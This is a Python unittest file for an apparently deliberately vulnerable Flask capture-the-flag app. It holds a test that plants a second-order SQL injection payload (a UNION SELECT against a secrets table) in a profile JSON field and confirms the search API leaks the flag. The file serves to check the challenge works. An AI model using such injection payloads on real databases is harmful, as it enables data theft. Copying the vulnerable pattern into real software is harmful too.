import os
import sys
import tempfile
import unittest


sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from app import create_app  # noqa: E402


class UnionStationTests(unittest.TestCase):
    def setUp(self):
        handle = tempfile.NamedTemporaryFile(delete=False)
        self.database_path = handle.name
        handle.close()
        self.app = create_app(
            {
                "TESTING": True,
                "DATABASE": self.database_path,
                "SECRET_KEY": "test-secret",
            }
        )
        with self.app.app_context():
            self.app.init_db()
        self.client = self.app.test_client()

    def tearDown(self):
        if os.path.exists(self.database_path):
            os.unlink(self.database_path)

    def register(self):
        return self.client.post(
            "/register",
            data={"username": "operator", "password": "copydesk"},
            follow_redirects=True,
        )

    def test_normal_search_returns_archive_notes(self):
        self.register()
        response = self.client.get("/search?q=Relay")
        self.assertEqual(response.status_code, 200)
        self.assertIn(b"Relay Schedule", response.data)
        self.assertNotIn(self.app.config["FLAG"].encode("utf-8"), response.data)

    def test_json_connector_injection_returns_flag(self):
        self.register()
        # Set profile_json containing the second-order SQL injection payload
        self.client.post(
            "/update_profile",
            data={
                "profile_json": '{"connector": "OR 1=1 UNION SELECT 1, label, value FROM secrets --"}'
            },
        )
        response = self.client.post(
            "/api/search",
            json={"term": "Relay"},
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn(self.app.config["FLAG"].encode("utf-8"), response.data)


if __name__ == "__main__":
    unittest.main()
